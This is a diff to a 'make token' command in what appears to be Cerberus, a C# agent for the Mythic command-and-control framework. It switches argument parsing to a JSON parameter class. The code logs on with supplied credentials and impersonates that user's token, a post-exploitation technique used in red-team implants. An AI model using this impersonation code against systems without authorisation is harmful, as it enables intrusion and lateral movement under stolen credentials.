@@ -14,18 +14,15 @@ namespace Cerberus.Commands
 
         public override string Execute(MythicTask task)
         {
-            var Arguments = task.parameters.Split(' ');
+            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<MakeTokenParam>();
 
-            var userDomain = Arguments[0];
-            var password = Arguments[1];
-
-            var split = userDomain.Split('\\');
+            var split = Arguments.username.Split('\\');
             var domain = split[0];
             var username = split[1];
 
             var hToken = IntPtr.Zero;
 
-            if (Native.Advapi.LogonUserA(username, domain, password, Native.Advapi.LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS,
+            if (Native.Advapi.LogonUserA(username, domain, Arguments.password, Native.Advapi.LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS,
                     Native.Advapi.LogonUserProvider.LOGON32_PROVIDER_DEFAULT, ref hToken))
             {
                 if (Native.Advapi.ImpersonateLoggedOnUser(hToken))
@@ -39,5 +36,11 @@ namespace Cerberus.Commands
 
             return "Failed to make token";
         }
+    }
+
+    public class MakeTokenParam
+    {
+        public string username { get; set; }
+        public string password { get; set; }
     }
 }
